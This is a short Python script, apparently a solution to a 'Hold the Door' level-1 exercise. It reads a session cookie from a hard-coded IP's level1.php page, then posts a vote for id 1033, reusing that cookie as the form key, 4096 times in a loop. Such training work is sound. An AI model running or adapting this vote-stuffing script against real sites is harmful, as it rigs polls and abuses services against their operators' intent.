#!/usr/bin/python
import requests
url = 'http://158.69.76.135/level1.php'
x = requests.get(url)
cookie = x.cookies.get('HoldTheDoor')
url = 'http://158.69.76.135/level1.php'

data = {
  'id': '1033',
  'holdthedoor': 'Valider',
  'key': cookie
}

cookies = {
  'HoldTheDoor' : cookie,
}
i = 0
while i < 4096:
    requests.post(url, data=data, cookies=cookies)
    i += 1
